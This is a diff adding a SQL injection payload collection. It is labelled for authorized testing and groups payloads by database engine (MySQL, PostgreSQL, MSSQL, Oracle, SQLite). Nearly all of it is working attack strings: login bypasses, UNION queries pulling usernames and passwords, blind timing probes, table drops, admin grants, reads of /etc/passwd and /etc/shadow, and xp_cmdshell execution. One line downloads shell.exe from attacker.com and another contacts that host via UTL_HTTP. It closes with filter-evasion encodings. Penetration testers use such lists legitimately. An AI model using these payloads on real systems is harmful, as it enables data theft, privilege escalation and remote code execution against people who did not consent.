@@ -1,0 +1,273 @@
+# SQL Injection Payloads Collection
+# For authorized security testing only
+
+# ============================================
+# UNIVERSAL SQLi DETECTION
+# ============================================
+
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1"--
+') OR ('1'='1
+1' OR '1'='1
+1" OR "1"="1
+admin'--
+admin'/*
+') OR ('1'='1'--
+1 OR 1=1
+1' AND '1'='1
+' OR ''='
+' OR 1=1 LIMIT 1 --
+' OR 1=1 OFFSET 0 --
+true OR 1=1
+; SELECT 1--
+
+# ============================================
+# MYSQL SQLi PAYLOADS
+# ============================================
+
+# Authentication Bypass
+' OR '1'='1'#
+' OR '1'='1'/*
+' OR 1=1#
+' OR 1=1 LIMIT 1#
+admin' #
+admin' OR '1'='1'#
+' OR 'x'='x
+' OR 'x'='x'#
+' OR 1=1 -- -
+" OR "1"="1"#
+' OR ''='#
+
+# UNION-based SQLi
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3-- 
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
+' UNION SELECT 1,@@version,3--
+' UNION SELECT 1,database(),3--
+' UNION SELECT 1,user(),3--
+
+# Error-based SQLi
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--
+
+# Time-based blind SQLi
+' OR SLEEP(5)--
+' OR SLEEP(5)#
+' OR BENCHMARK(10000000,SHA1('test'))--
+' OR IF(1=1,SLEEP(5),0)--
+' OR IF(SUBSTRING((SELECT version()),1,1)='5',SLEEP(5),0)--
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+# Stacked queries (MySQL with multiple statements)
+'; SELECT 1--
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacker','pass123')--
+'; UPDATE users SET role='admin' WHERE username='attacker'--
+
+# MySQL specific
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
+' UNION SELECT 1,INTO OUTFILE('/tmp/shell.php')--
+' UNION SELECT 1,@@datadir,3--
+' UNION SELECT 1,@@hostname,3--
+' UNION SELECT 1,@@version_compile_os,3--
+
+# ============================================
+# POSTGRESQL SQLi PAYLOADS
+# ============================================
+
+# Authentication Bypass
+' OR '1'='1'--
+') OR ('1'='1'--
+'; SELECT 1--
+1' OR '1'='1'/*
+
+# UNION-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT version(),NULL,NULL--
+' UNION SELECT current_database(),NULL,NULL--
+' UNION SELECT current_user,NULL,NULL--
+' UNION SELECT NULL,string_agg(tablename,','),NULL FROM pg_tables--
+' UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'--
+
+# Error-based
+' AND 1=CAST((SELECT version()) AS INT)--
+' AND 1=CAST((SELECT current_database()) AS INT)--
+
+# Time-based
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+'; SELECT CASE WHEN (SELECT substring(version(),1,1)='1') THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+# PostgreSQL specific
+' UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL--
+'; CREATE TABLE pwned(data text)--
+'; COPY pwned FROM '/etc/passwd'--
+
+# ============================================
+# MSSQL SQLi PAYLOADS
+# ============================================
+
+# Authentication Bypass
+'; EXEC xp_cmdshell 'dir'--
+' OR '1'='1'--
+') OR ('1'='1'--
+'; WAITFOR DELAY '0:0:5'--
+
+# UNION-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,@@version,3--
+' UNION SELECT 1,db_name(),3--
+' UNION SELECT 1,user_name(),3--
+' UNION SELECT NULL,name,NULL FROM master..sysdatabases--
+' UNION SELECT NULL,name,NULL FROM master..sysobjects WHERE xtype='U'--
+
+# Error-based
+' AND 1=CONVERT(INT,(SELECT @@version))--
+' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND 1=(SELECT TOP 1 CAST(name AS INT) FROM master..sysdatabases)--
+
+# Time-based
+'; WAITFOR DELAY '0:0:5'--
+'; IF (1=1) WAITFOR DELAY '0:0:5'--
+'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--
+
+# MSSQL specific
+'; EXEC xp_cmdshell 'whoami'--
+'; EXEC xp_cmdshell 'powershell -e <base64>'--
+'; EXEC sp_makewebtask '/tmp/shell.exe','exec master..xp_cmdshell ''wget http://attacker.com/shell.exe'''--
+'; DECLARE @q VARCHAR(100);SET @q='EXEC xp_cmdshell ''whoami''';EXEC(@q)--
+
+# ============================================
+# ORACLE SQLi PAYLOADS
+# ============================================
+
+# Authentication Bypass
+' OR '1'='1'--
+' OR 1=1--
+') OR ('1'='1'--
+
+# UNION-based
+' UNION SELECT NULL FROM dual--
+' UNION SELECT NULL,NULL FROM dual--
+' UNION SELECT NULL,NULL,NULL FROM dual--
+' UNION SELECT banner,NULL,NULL FROM v$version--
+' UNION SELECT user,NULL,NULL FROM dual--
+' UNION SELECT owner,NULL,NULL FROM all_tables--
+' UNION SELECT table_name,NULL,NULL FROM all_tables--
+' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'--
+
+# Error-based
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
+
+# Time-based
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+'; BEGIN DBMS_LOCK.SLEEP(5); END;--
+
+# Oracle specific
+' UNION SELECT NULL,UTL_HTTP.REQUEST('http://attacker.com') FROM dual--
+'; EXECUTE IMMEDIATE 'GRANT DBA TO current_user'--
+
+# ============================================
+# SQLITE SQLi PAYLOADS
+# ============================================
+
+# Authentication Bypass
+' OR '1'='1'--
+' OR 1=1--
+' OR ''='
+' UNION SELECT 1--
+
+# UNION-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT sql,NULL,NULL FROM sqlite_master--
+' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'--
+' UNION SELECT name,NULL,NULL FROM pragma_table_info('users')--
+' UNION SELECT GROUP_CONCAT(name),NULL,NULL FROM sqlite_master WHERE type='table'--
+
+# Error-based
+' AND 1=CAST((SELECT version()) AS INT)--
+
+# Time-based (no native sleep, use busy wait)
+' AND 1=(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x WHERE RANDOMBLOB(500000000))--
+
+# SQLite specific
+' UNION SELECT NULL,load_extension('/tmp/evil.so'),NULL--
+'; ATTACH DATABASE '/tmp/evil.db' AS evil--
+
+# ============================================
+# DATA EXTRACTION QUERIES
+# ============================================
+
+# Get all databases
+' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
+
+# Get all tables
+' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
+
+# Get all columns
+' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
+
+# Get table data
+' UNION SELECT NULL,group_concat(username,0x3a,password SEPARATOR 0x0a),NULL FROM users--
+
+# Get users
+' UNION SELECT NULL,group_concat(user,0x3a,host),NULL FROM mysql.user--
+
+# Get file contents
+' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
+' UNION SELECT NULL,LOAD_FILE('/etc/shadow'),NULL--
+
+# ============================================
+# BYPASS TECHNIQUES
+# ============================================
+
+# Comment bypass
+'/**/OR/**/1=1--
+'/**/UNION/**/SELECT/**/1,2,3--
+
+# Case variation
+' oR 1=1--
+' UnIoN SeLeCt 1,2,3--
+
+# Inline comments
+'/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
+
+# Alternative characters
+' || '1'='1
+' && '1'='1
+
+# Hex encoding
+' UNION SELECT 1,0x7573657273,3--
+
+# Char() encoding
+' UNION SELECT 1,CHAR(117,115,101,114,115),3--
+
+# Double encoding
+%27%20OR%20%271%27%3D%271
+%2527%2520OR%2520%25271%2527%253D%25271
+
+# Null byte
+' OR 1=1%00--
+
+# Parentheses
+') OR ('1'='1
+')) OR (('1'='1
+
+# Type juggling (PHP)
+' OR 1=1#
+' OR 'a'='a
